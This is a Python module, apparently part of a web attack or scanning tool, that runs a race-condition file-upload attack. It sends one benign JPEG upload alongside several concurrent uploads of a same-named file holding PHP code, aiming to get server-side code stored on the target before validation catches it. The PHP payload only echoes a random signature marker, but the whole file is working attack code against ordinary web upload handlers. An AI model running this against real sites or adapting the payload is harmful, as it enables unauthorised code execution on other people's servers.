

import threading
import time
import random
import string


class RaceCondition:
    def __init__(self, http_client, threads=5):
        self.http = http_client
        self.threads = threads
        self.signature = self.generate_signature()

   
    def generate_signature(self):
        return "RACE_" + ''.join(random.choices(string.ascii_uppercase, k=5))

  
    def create_safe_file(self):
        filename = "race_test.jpg"
        content = b"\xff\xd8\xff\xdb" + b"SAFE_IMAGE_CONTENT"
        return filename, content

    def create_malicious_file(self):
        filename = "race_test.jpg"  
        content = f"<?php echo '{self.signature}'; ?>".encode()
        return filename, content

   
    def upload(self, url, filename, content):
        files = {
            "file": (filename, content)
        }

        try:
            response = self.http.post(url, files=files)
            return response
        except Exception:
            return None

    
    def worker(self, url, use_malicious=False):
        if use_malicious:
            filename, content = self.create_malicious_file()
        else:
            filename, content = self.create_safe_file()

        return self.upload(url, filename, content)

   
    def run(self, upload_url):
        print(f"[INFO] Starting race condition attack on {upload_url}")

        threads = []

       
        t_safe = threading.Thread(target=self.worker, args=(upload_url, False))
        threads.append(t_safe)

        
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker, args=(upload_url, True))
            threads.append(t)

     
        for t in threads:
            t.start()

        for t in threads:
            t.join()

        print("[INFO] Race attack completed")

        return {
            "signature": self.signature,
            "filename": "race_test.jpg"
        }
